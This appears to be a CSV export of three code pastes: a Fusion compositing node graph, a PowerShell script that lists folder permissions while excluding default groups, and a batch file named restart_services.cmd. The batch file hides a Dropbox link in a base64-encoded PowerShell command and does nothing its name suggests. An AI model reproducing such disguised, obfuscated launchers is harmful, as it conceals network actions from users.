id,title,username,language,date,content
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke3"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.13548056781292, 0.145389467477798 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke3 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378692717 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke2"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.150477170944214, 0.000170444865943864 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke2 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378690677 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				Paint = Input {
					SourceOp = ""Stroke1"",
					Source = ""Out"",
				},
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.0543626435101032, 0.0390318743884563 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		Stroke1 = Stroke {
			Points = {
				{ X = 0, Y = 0, Time = 1378688247 }
			},
			IsThreaded = false,
			Brushes = {
				""SoftBrush"",
				""CircleBrush""
			},
			ApplyModes = { ""PaintApplyColor"" },
			CtrlWZoom = false,
			Inputs = {
				BrushControls = Input { Value = 1, },
				BrushShape = Input { Value = FuID { ""CircleBrush"" }, },
				Center = Input { Value = { 0.0189161561429501, 0.034600306302309 }, },
				[""CircleBrush.Size""] = Input { Value = 0.00737640136990311, }
			},
		},
		SoftGlow1_2_2 = SoftGlow {
			CustomData = {
				Settings = {
				}
			},
			Inputs = {
				Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
				Threshold = Input { Value = 0.175, },
				Gain = Input { Value = 2.5, },
				XGlowSize = Input { Value = 5, },
				ClippingMode = Input { Value = FuID { ""None"" }, },
				ColorScale = Input { Value = 1, },
				RedScale = Input { Value = 1.3, },
				GreenScale = Input { Value = 1.024, },
				BlueScale = Input { Value = 0.71, },
				Input = Input {
					SourceOp = ""BG_2"",
					Source = ""Output"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { 5005, 445.5 } },
		},
		BG_2 = Background {
			NameSet = true,
			CustomData = {
				Settings = {
				}
			},
			Inputs = {
				EffectMask = Input {
					SourceOp = ""Polygon3_1"",
					Source = ""Mask"",
				},
				GlobalOut = Input { Value = 99, },
				Width = Input { Value = 1080, },
				Height = Input { Value = 1080, },
				UseFrameFormatSettings = Input { Value = 1, },
				Depth = Input { Value = 2, },
				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
				TopLeftRed = Input { Value = 0.953, },
				TopLeftGreen = Input { Value = 0.953, },
				TopLeftBlue = Input { Value = 0.953, }
			},
			ViewInfo = OperatorInfo { Pos = { 5005, 379.5 } },
		},
		Polygon3_1 = PolylineMask {
			DrawMode = ""InsertAndModify"",
			DrawMode2 = ""InsertAndModify"",
			CustomData = {
				Settings = {
				}
			},
			Inputs = {
				EffectMask = Input {
					SourceOp = ""Ellipse1_3_1_2_1"",
					Source = ""Mask"",
				},
				Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
				MaskWidth = Input { Value = 1080, },
				MaskHeight = Input { Value = 1080, },
				PixelAspect = Input { Value = { 1, 1 }, },
				ClippingMode = Input { Value = FuID { ""None"" }, },
				Polyline = Input {
					Value = Polyline {
						Closed = true,
						Points = {
							{ Linear = true, X = 0.250048179948642, Y = 0.0137103215981931, LX = 0.0190240857754257, LY = -0.00129945359701021, RX = -0.050008092300273, RY = 0.0023429325565818 },
							{ X = 0.155180653175224, Y = 0.0996080317439233, LX = 0.0259344854982108, LY = -0.0504068196106731, RX = -0.00634872786643511, RY = 0.0111164106598293 },
							{ X = 0.131606672939801, Y = 0.12846669195315, LX = 0.0089404851700467, LY = -0.00862273698188708, RX = -0.00961718353715526, RY = 0.0092753852358318 },
							{ X = 0.100547199713634, Y = 0.153804727335885, LX = 0.0111888934111642, LY = -0.00730285250392085, RX = -0.0142187716203402, RY = 0.00928041658048788 },
							{ X = 0.0546139744742205, Y = 0.175823701058436, LX = 0.0163674873709979, LY = -0.00451718446147705, RX = -0.0177145105445752, RY = 0.00488894293674032 },
							{ X = -2.82763968002808e-06, Y = 0.183330747661737, LX = 0.0181602739953269, LY = -3.8360453443629e-05, RX = 1.58712797849117e-06, RY = -0.0129622634274003 },
							{ Linear = true, X = 1.93374425544544e-06, Y = 0.144443957379536, LX = -1.58712797849117e-06, LY = 0.0129622634274003, RX = 0.013380893933308, RY = -0.000586165352053653 },
							{ X = 0.041390790948867, Y = 0.138729709965818, LX = -0.013394806375694, LY = 0.00381375556560871, RX = 0.0135994905525783, RY = -0.00387203303501662 },
							{ X = 0.0798639556315025, Y = 0.120861731699429, LX = -0.0119568763210141, LY = 0.0075479726919153, RX = 0.0095831644962077, RY = -0.00604952848699979 },
							{ X = 0.105888009658883, Y = 0.0989835886779672, LX = -0.00759426280881582, LY = 0.00841195631628187, RX = 0.00793794229525864, RY = -0.00879264064332453 },
							{ X = 0.126484529089925, Y = 0.0700236766681526, LX = -0.00556916718353494, LY = 0.0104549430532804, RX = 0.00462157266887695, RY = -0.00867603314415788 },
							{ X = 0.137742788726957, Y = 0.0427666783848621, LX = -0.00311101029975966, LY = 0.00932491822843642, RX = 0.0027234511117028, RY = -0.00816325131348322 },
							{ X = 0.142799041351788, Y = 0.0174499441744988, LX = -0.000603122126146119, LY = 0.00880855083180617, RX = -0.0189310201337992, RY = 0.000386057879807161 },
							{ Linear = true, X = 0.08600598095039, Y = 0.0186081178139203, LX = 0.0189310201337992, LY = -0.000386057879807161, RX = -0.0289470901385809, RY = 0.000584701700511587 },
							{ X = -0.000849683299860796, Y = 0.0193675384977854, LX = 0.028952920595889, LY = 6.55174622148272e-05, RX = -0.0275892107683575, RY = -6.24315280410579e-05 },
							{ X = -0.0836096315327127, Y = 0.0182242952408192, LX = 0.0275860133573293, LY = 0.00042463580371725, RX = -0.0193992675871726, RY = -0.000188603706852933 },
							{ Linear = true, X = -0.14180743429423, Y = 0.0176584841202604, LX = 0.0193992675871726, LY = 0.000188603706852933, RX = 0.000645737852992311, RY = 0.00697971862011963 },
							{ X = -0.138871310806356, Y = 0.0382563875219476, LX = -0.00146053577138264, LY = -0.00677983796842246, RX = 0.00149411723327595, RY = 0.00693572382540757 },
							{ X = -0.132127844031618, Y = 0.0584443991068688, LX = -0.00288993414926835, LY = -0.00647957806512052, RX = 0.00328134343147712, RY = 0.00735716449736728 },
							{ X = -0.120396045863232, Y = 0.0795730477255722, LX = -0.00472055362203963, LY = -0.00652774522006398, RX = 0.00537695989795764, RY = 0.00743544657738749 },
							{ X = -0.102990996640049, Y = 0.100900080652902, LX = -0.00630599916813317, LY = -0.0066657286204084, RX = 0.00561687028187838, RY = 0.00593728796924692 },
							{ X = -0.0846332264684511, Y = 0.117154244921351, LX = -0.00652422566381242, LY = -0.00492291577023863, RX = 0.00667485946281575, RY = 0.00503657791849289 },
							{ X = -0.0631417196985819, Y = 0.130092673363676, LX = -0.00757302471782108, LY = -0.00354544251126176, RX = 0.0105920844977962, RY = 0.00495886756753759 },
							{ X = -0.029987244023259, Y = 0.141574151349629, LX = -0.0114155054374675, LY = -0.00254339481166026, RX = 0.00980153730351765, RY = 0.00218379985543519 },
							{ X = 1.47182074294877e-06, Y = 0.144442767726094, LX = -0.0104239058835819, LY = -3.07609593942839e-05, RX = -1.64999467530913e-06, RY = 0.0129635394333832 },
							{ Linear = true, X = -3.47816328297862e-06, Y = 0.183333386026244, LX = 1.64999467530913e-06, LY = -0.0129635394333832, RX = -0.0129380984552594, RY = 2.32151932499929e-05 },
							{ X = -0.0378613493702643, Y = 0.180843207947981, LX = 0.0123221745310259, LY = 0.00284596268868089, RX = -0.0139569890342268, RY = -0.00322354385889638 },
							{ X = -0.0784325282649098, Y = 0.166677106003392, LX = 0.0128848989330334, LY = 0.00625844688379402, RX = -0.0106586711467163, RY = -0.00517712459913314 },
							{ X = -0.10914785587405, Y = 0.148781361888594, LX = 0.00940961305312447, LY = 0.00720201860031344, RX = -0.00952154602761799, RY = -0.00728769091858407 },
							{ X = -0.135697882485427, Y = 0.124511450762616, LX = 0.00791332487786552, LY = 0.00900830544876312, RX = -0.00759595700433842, RY = -0.00864702282881745 },
							{ X = -0.156879713890113, Y = 0.097243225336892, LX = 0.00559937215694352, LY = 0.00974386685948333, RX = -0.0202084334287145, RY = -0.0374412053077912 },
							{ X = -0.249852507374631, Y = 0.0138643067846608, LX = 0.0538436819813177, LY = 0.0056614189824542, RX = -0.0174897746590665, RY = -0.00118307456047589 },
							{ Linear = true, X = -0.30232183135183, Y = 0.0103150831032331, LX = 0.0174897746590665, LY = 0.00118307456047589, RX = -0.0108486230290836, RY = -0.000733841926044959 },
							{ X = -0.33472897148685, Y = 0.00659250621814011, LX = 0.0107578344246101, LY = 0.0015811843954009, RX = -0.00535452241850593, RY = -0.000787006655688769 },
							{ X = -0.35072797995612, Y = 0.00382766693571225, LX = 0.00532632909608133, LY = 0.000959431168254616, RX = -0.00150334779162492, RY = -0.000270797898889285 },
							{ X = -0.355167454873111, Y = 0.00269120874332367, LX = 0.0014516081188279, LY = 0.00047562585503659, RX = -0.00132715861937303, RY = -0.000434849423147457 },
							{ X = -0.358525176320147, Y = 0.000185275208649175, LX = 0.000215211698503646, LY = 0.0013799014264124, RX = -0.000179958441339911, RY = -0.00115386343598645 },
							{ X = -0.355924376318404, Y = -0.00216204500311892, LX = -0.00107296401148276, LY = 0.000461014207567146, RX = 0.00155337917336708, RY = -0.000667431396577313 },
							{ X = -0.351144666934613, Y = -0.00385923147931767, LX = -0.00164972341449385, LY = 0.000369951592858465, RX = 0.00565280429687301, RY = -0.00126764519153471 },
							{ X = -0.334021415033079, Y = -0.00683317348782047, LX = -0.00574913376907097, LY = 0.000713149111823613, RX = 0.0107639318966872, RY = -0.00133520783829192 },
							{ X = -0.30165040429595, Y = -0.0101381322603705, LX = -0.0108078819244976, LY = 0.000913618166453561, RX = 0.0172163052609757, RY = -0.00145533873847984 },
							{ X = -0.249941993875596, Y = -0.0137315833795062, LX = -0.0172361368067846, LY = 0.0011978170397119, RX = 0.0223760885108223, RY = -0.00155501551193388 },
							{ X = -0.182708113580449, Y = -0.016457954632791, LX = -0.0224112934317157, LY = 0.00090879041776159, RX = 0.00230655030495224, RY = -0.0122233694579844 },
							{ X = -0.175788462665592, Y = -0.0531280630067441, LX = -0.00292458545608695, LY = 0.012090398468442, RX = 0.00296790185830926, RY = -0.0122694708774896 },
							{ X = -0.161743465721649, Y = -0.0882972721865323, LX = -0.00646024315224589, LY = 0.0108449811188393, RX = 0.00972963383649355, RY = -0.0163333937691354 },
							{ X = -0.126590114033191, Y = -0.133211096389737, LX = -0.0133549848470347, LY = 0.0135310718845678, RX = 0.0102992900145919, RY = -0.0104350873582906 },
							{ X = -0.0914588863475341, Y = -0.159677955820297, LX = -0.0127282439411281, LY = 0.00727724049038938, RX = 0.0138775637380248, RY = -0.00793435207632913 },
							{ X = -0.0471456738093963, Y = -0.178013867527017, LX = -0.0154923231983584, LY = 0.00394063955363802, RX = 0.0153269659465464, RY = -0.00389857915258465 },
							{ X = -1.28391878794236e-08, Y = -0.183335511305231, LX = -0.0157457167360524, LY = -5.34682970461942e-06, RX = -3.77839960157788e-07, RY = 0.0129630713701404 },
							{ Linear = true, X = -1.14635906835279e-06, Y = -0.144446297194809, LX = 3.77839960157788e-07, LY = -0.0129630713701404, RX = -0.014128254109285, RY = 3.74185475627551e-05 },
							{ X = -0.0412269180402034, Y = -0.138920669930164, LX = 0.0133380592702736, LY = -0.00378538683619716, RX = -0.0118664014796268, RY = 0.00336772532223785 },
							{ X = -0.0749630029853052, Y = -0.123713628999317, LX = 0.0104606042167561, LY = -0.00653672833626382, RX = -0.0092478172335246, RY = 0.00577886971979475 },
							{ X = -0.100473249461455, Y = -0.103232309360842, LX = 0.00786324014125579, LY = -0.00755558821694109, RX = -0.00809653422865011, RY = 0.007779754594431 },
							{ X = -0.122013717248223, Y = -0.0773341573010005, LX = 0.00580481874297385, LY = -0.00961158298234441, RX = -0.00679175732399015, RY = 0.0112457497823668 },
							{ X = -0.137902553473606, Y = -0.0412661855692388, LX = 0.00413790362587143, LY = -0.0124688655979033, RX = -0.00256807646696938, RY = 0.00773845966628477 },
							{ X = -0.142296778278065, Y = -0.0172037717025848, LX = 0.000330656879090146, LY = -0.0091413635753067, RX = 0.0473154095507457, RY = -0.000866692673993386 },
							{ X = -0.00033589204486693, Y = -0.0189300465133703, LX = -0.0473237188163049, LY = -8.55596798421667e-05, RX = 0.0476790073880519, RY = 0.00070493717416253 },
							{ Linear = true, X = 0.142701130119289, Y = -0.0168152349908827, LX = -0.0476790073880519, LY = -0.00070493717416253, RX = -0.000434884483059016, RY = -0.00695838185462612 },
							{ X = 0.139646567811198, Y = -0.0376903805547611, LX = 0.00140035953175601, LY = 0.00689164544006, RX = -0.00174130433930096, RY = -0.00856955077433002 },
							{ X = 0.130658428149921, Y = -0.0623366260479874, LX = 0.00393705681665301, LY = 0.00780826004295032, RX = -0.00396672376358087, RY = -0.00786709770953246 },
							{ X = 0.117036465379612, Y = -0.0849878345008556, LX = 0.0049994942605068, LY = 0.00725473506939072, RX = -0.00493418585161644, RY = -0.0071599664428827 },
							{ X = 0.100184426792375, Y = -0.104900407935442, LX = 0.00620348516178722, LY = 0.0060932816551497, RX = -0.00599992790088439, RY = -0.00589334054280981 },
							{ X = 0.0803753769549538, Y = -0.120526569417475, LX = 0.00700503836288775, LY = 0.00465403428262059, RX = -0.00706450810908055, RY = -0.00469354502092381 },
							{ X = 0.0582360971335459, Y = -0.133067783320831, LX = 0.007717567338295, LY = 0.00351792468162491, RX = -0.00834484953817213, RY = -0.00380386083696519 },
							{ X = 0.032016327810221, Y = -0.141403041947124, LX = 0.0089973907936984, LY = 0.00177562101451872, RX = -0.0105215764164588, RY = -0.0020764166655975 },
							{ X = -1.29764788755482e-05, Y = -0.144445948640423, LX = 0.0109606870017038, LY = -7.26360686688236e-05, RX = 4.47129233546728e-06, RY = -0.0129606162652199 },
							{ Linear = true, X = 4.37398130853637e-07, Y = -0.183327797436083, LX = -4.47129233546728e-06, LY = 0.0129606162652199, RX = 0.0146179667056262, RY = -2.56225638436744e-06 },
							{ X = 0.0441992611685316, Y = -0.17806525389291, LX = -0.01444779582279, LY = -0.0033760784284839, RX = 0.013114418308875, RY = 0.00306450238484593 },
							{ X = 0.0822094859730252, Y = -0.164367257968915, LX = -0.0121081386003815, LY = -0.00589678913314976, RX = 0.00977392848404656, RY = 0.0047600045865921 },
							{ X = 0.110029645620355, Y = -0.147345959185397, LX = -0.00882901134683038, LY = -0.00634317588540432, RX = 0.00836192283802341, RY = 0.00600759759141135 },
							{ X = 0.133561777037549, Y = -0.12733707035347, LX = -0.00707907127010807, LY = -0.00747661235601522, RX = 0.00660959272996294, RY = 0.00698076919803562 },
							{ X = 0.151088903559108, Y = -0.104433783956814, LX = -0.0053301109192621, LY = -0.00800048575028946, RX = 0.00631145454466097, RY = 0.00947348055472554 },
							{ X = 0.168263350909996, Y = -0.0749165010736903, LX = -0.00485231716959199, LY = -0.0102973933777324, RX = 0.00459520812044331, RY = 0.00975176683941581 },
							{ X = 0.178548209330571, Y = -0.0442548355169501, LX = -0.00222497562137315, LY = -0.0105480982951816, RX = 0.00198475698414305, RY = 0.00940927691956856 },
							{ X = 0.182863247135595, Y = -0.0157303859927562, LX = -0.000855042982036924, LY = -0.00950814984139796, RX = 0.00470162521224566, RY = 0.000142664757171502 },
							{ X = 0.196959285635382, Y = -0.015072575478245, LX = -0.00470121112077692, LY = -0.000155867664683622, RX = 0.0177636857536004, RY = 0.000588951260314779 },
							{ X = 0.250245088481239, Y = -0.0131837959279409, LX = -0.0177539461070558, LY = -0.000821495661474832, RX = 0.0190529340940652, RY = 0.000881601341034829 },
							{ X = 0.30737125144212, Y = -0.0099088650855236, LX = -0.0190420543202937, LY = -0.00109164361413911, RX = 0.00940159985993338, RY = 0.000538975274261752 },
							{ X = 0.33538934401793, Y = -0.00628786289463565, LX = -0.0093001278700775, LY = -0.00147925517500282, RX = 0.00440212111034509, RY = 0.000700190419361713 },
							{ X = 0.348590392262914, Y = -0.00415414377647208, LX = -0.00439161593752982, LY = -0.000763312747663704, RX = 0.00188733058197368, RY = 0.000328039499074773 },
							{ X = 0.354134900524466, Y = -0.00264249967648254, LX = -0.0018446463644694, LY = -0.00051662987588424, RX = 0.0015822631226828, RY = 0.000443144234273304 },
							{ X = 0.358282646491758, Y = 2.12578212558385e-05, LX = 7.07484418630148e-05, LY = -0.00164162360477229, RX = -7.38432967406165e-05, RY = 0.00171343560072059 },
							{ X = 0.353903688358534, Y = 0.00272247147072548, LX = 0.00165868464402906, LY = -0.000435981240367601, RX = -0.00187205345797521, RY = 0.000492064716207857 },
							{ X = 0.34830188318326, Y = 0.00425223788699659, LX = 0.0018825511396518, LY = -0.000450236650051256, RX = -0.00425511896308136, RY = 0.00101766717894404 },
							{ X = 0.335413914359891, Y = 0.00673727601578835, LX = 0.00433175473941563, LY = -0.000614479254836782, RX = -0.00939265166711982, RY = 0.00133239066949849 },
							{ X = 0.307120437274919, Y = 0.00981196080716248, LX = 0.00946463011412979, LY = -0.000646488235564207, RX = -0.0190240857754257, RY = 0.00129945359701021 }
						}
					},
				},
				Polyline2 = Input {
					Value = Polyline {
					},
					Disabled = true,
				}
			},
			ViewInfo = OperatorInfo { Pos = { 5005, 313.5 } },
		},
		Ellipse1_3_1_2_1 = EllipseMask {
			Inputs = {
				Level = Input { Value = 0.346, },
				Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
				PaintMode = Input { Value = FuID { ""Maximum"" }, },
				MaskWidth = Input { Value = 1080, },
				MaskHeight = Input { Value = 1080, },
				PixelAspect = Input { Value = { 1, 1 }, },
				UseFrameFormatSettings = Input { Value = 1, },
				ClippingMode = Input { Value = FuID { ""None"" }, },
				Center = Input { Value = { 0.5, 0.4922 }, },
				Width = Input { Value = 0.812, },
				Height = Input { Value = 0.0545208, }
			},
			ViewInfo = OperatorInfo { Pos = { 5005, 280.5 } },
		},
		Merge7 = Merge {
			Inputs = {
				Background = Input {
					SourceOp = ""Background4_1_1_1_1"",
					Source = ""Output"",
				},
				Foreground = Input {
					SourceOp = ""Paint1"",
					Source = ""Output"",
				},
				PerformDepthMerge = Input { Value = 0, }
			},
			ViewInfo = OperatorInfo { Pos = { 5170, 643.5 } },
		},
		Background4_1_1_1_1 = Background {
			Inputs = {
				GlobalOut = Input { Value = 99, },
				Width = Input { Value = 1080, },
				Height = Input { Value = 1080, },
				UseFrameFormatSettings = Input { Value = 1, },
				Depth = Input { Value = 2, },
				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
				Type = Input { Value = FuID { ""Gradient"" }, },
				TopLeftRed = Input { Value = 0.933333337306976, },
				TopLeftGreen = Input { Value = 0.776470601558685, },
				TopLeftBlue = Input { Value = 0.61176472902298, },
				GradientType = Input { Value = FuID { ""Radial"" }, },
				Start = Input { Value = { 0.5, 0.5 }, },
				Gradient = Input {
					Value = Gradient {
						Colors = {
							[0.6618497109827] = { 0.307, 0.234218536585362, 0.157798, 1 },
							[1] = { 0, 0, 0, 1 }
						}
					},
				}
			},
			ViewInfo = OperatorInfo { Pos = { 5060, 643.5 } },
		}
	}
}"
FtRCAQzU,Folder Group Permissions with exceptions,joedigital,PowerShell,Friday 9th of May 2025 10:01:38 AM CDT,"<#
.SYNOPSIS
    Lists groups and users with permissions on folders, excluding specified default identities.
.DESCRIPTION
    This script recursively scans a specified folder path, identifies all security principals (users or groups)
    that have permissions, and lists those whose names are not in a predefined exclusion list.
    The exclusion list targets common administrative, system, and broad access accounts.
.PARAMETER Path
    The root folder path to scan for permissions. This parameter is mandatory.
.EXAMPLE
    .\Get-FolderPermissionsExcludingDefaults.ps1 -Path ""C:\Shares\DepartmentX""

    This command will scan the ""C:\Shares\DepartmentX"" folder and its subfolders,
    displaying security principals (groups or users) with their permissions,
    excluding the predefined system/admin/common groups.
.EXAMPLE
    Get-ChildItem -Path ""C:\Projects"" -Directory | .\Get-FolderPermissionsExcludingDefaults.ps1

    This command gets all subdirectories of ""C:\Projects"" and pipes them to the script
    to analyze permissions for each.
.OUTPUTS
    PSCustomObject
    Outputs objects with the following properties:
    - FolderPath: The full path to the folder.
    - Identity: The security principal (e.g., ""DOMAIN\GroupName"" or ""BUILTIN\Users"").
    - Permissions: The file system rights granted to the security principal (e.g., ""ReadAndExecute, Synchronize"").
    - AccessControlType: Specifies whether the rights are ""Allow"" or ""Deny"".
    - IsInherited: Indicates if the permission is inherited from a parent folder (True/False).
.NOTES
    Author: Gemini
    Date: 2025-05-09
    The script filters identities based on the name part of the IdentityReference (e.g., ""GroupName"" from ""DOMAIN\GroupName"").
    The exclusion list matching is case-insensitive.
    If you need to exclude ""Backup Operators"" (the built-in group), ensure ""Backup Operators"" is in the $ExcludedIdentities list.
    The script requires appropriate permissions to read ACLs of the target folders.
#>
[CmdletBinding()]
param (
    [Parameter(Mandatory = $true, ValueFromPipeline = $true, Position = 0)]
    [string]$Path
)

begin {
    # List of identity names to exclude (case-insensitive matching will be used)
    # These are the ""name parts"" after any domain or ""BUILTIN\"" prefix.
    $Global:ExcludedIdentities = @(
        ""Domain Admins"",
        ""Backup_OPs"",      # This is per user request. The built-in group is ""Backup Operators"".
                           # Add ""Backup Operators"" to this list if you want to exclude the built-in group.
        ""Administrators"",  # Matches BUILTIN\Administrators
        ""SYSTEM"",          # Matches NT AUTHORITY\SYSTEM
        ""Domain Users"",
        ""CREATOR OWNER"",   # Matches special identity
        ""Authenticated Users"", # Matches well-known group
        ""Users""            # Matches BUILTIN\Users
    )

    Write-Verbose ""Script initialized. Excluded identities (case-insensitive): $($Global:ExcludedIdentities -join ', ')""
    $Global:Results = [System.Collections.Generic.List[PSCustomObject]]::new()
}

process {
    # Validate the path
    if (-not (Test-Path -Path $Path -PathType Container)) {
        Write-Error ""The path '$Path' does not exist or is not a folder. Please provide a valid folder path. Skipping this item.""
        return # Changed from 'continue' to 'return' as process block handles one item from pipeline
    }

    Write-Verbose ""Starting permission scan for base folder: $Path""

    # Create a list of folders to process: the root path itself and all its subdirectories
    $FoldersToProcess = [System.Collections.Generic.List[System.IO.DirectoryInfo]]::new()
    try {
        $RootFolderItem = Get-Item -Path $Path -ErrorAction Stop
        $FoldersToProcess.Add($RootFolderItem)

        $SubFolders = Get-ChildItem -Path $Path -Directory -Recurse -ErrorAction SilentlyContinue # Continue if some subfolders are inaccessible
        if ($null -ne $SubFolders) {
            $FoldersToProcess.AddRange($SubFolders)
        }
    }
    catch {
        Write-Error ""Error accessing folder structure for '$Path': $($_.Exception.Message)""
        return
    }

    foreach ($Folder in $FoldersToProcess) {
        Write-Verbose ""Processing folder: $($Folder.FullName)""
        try {
            # Get-Acl can be slow; ensure errors don't stop the whole script for one folder.
            $Acl = Get-Acl -Path $Folder.FullName -ErrorAction SilentlyContinue
            if (-not $Acl) {
                Write-Warning ""Could not retrieve ACL for $($Folder.FullName). Skipping.""
                continue
            }

            foreach ($Ace in $Acl.Access) {
                $IdentityName = $Ace.IdentityReference.Value
                # Extract the name part, e.g., ""Administrators"" from ""BUILTIN\Administrators"" or ""SalesUsers"" from ""CONTOSO\SalesUsers""
                $IdentityNamePart = $IdentityName.Split('\')[-1]

                # Check if the identity name part is in the exclusion list (PowerShell -eq is case-insensitive for strings)
                $IsExcluded = $false
                foreach ($ExcludedItem in $Global:ExcludedIdentities) {
                    if ($IdentityNamePart -eq $ExcludedItem) {
                        $IsExcluded = $true
                        Write-Verbose ""Excluding '$IdentityName' because '$IdentityNamePart' is in the exclusion list.""
                        break
                    }
                }

                if (-not $IsExcluded) {
                    $OutputObject = [PSCustomObject]@{
                        FolderPath        = $Folder.FullName
                        Identity          = $IdentityName
                        Permissions       = $Ace.FileSystemRights.ToString() # Convert FileSystemRights enum to string
                        AccessControlType = $Ace.AccessControlType.ToString()
                        IsInherited       = $Ace.IsInherited
                    }
                    $Global:Results.Add($OutputObject)
                }
            }
        }
        catch {
            # Catch errors specific to processing a single folder's ACL
            Write-Warning ""Error processing ACL for folder '$($Folder.FullName)': $($_.Exception.Message)""
        }
    }
}

end {
    if ($Global:Results.Count -eq 0) {
        Write-Host ""No non-excluded identities with permissions found in the processed path(s).""
    } else {
        Write-Output $Global:Results
    }
    Write-Verbose ""Script finished. Total matching ACEs found: $($Global:Results.Count)""
}
"
TuizAf14,restart_services.cmd,ccmoi,Batch,Friday 9th of May 2025 10:01:14 AM CDT,"@ECHO OFF
TITLE $~foddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==tutorial GOTO tutorial

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwBwADUANgBjAGcANQByADgAMABqAGMAeAB0AGQAeQB2AHUAegB0AGcAcQAvAHYAMQAuADgALgBwAGQAZgA/AHIAbABrAGUAeQA9AHIAZgBhAGcANQA5AGoAbgBjADYAZABoAGoAZgBnAHgAdAB2AGUAegBhAHYAYQBlAHgAJgBzAHQAPQAyAGcAcwBkADUAZAA3AGgAJgBkAGwAPQAwACIAIAAgACMAIABpAGQAPQBmADAAYgA5AGIAOQA4ADgA
EXIT /b
"
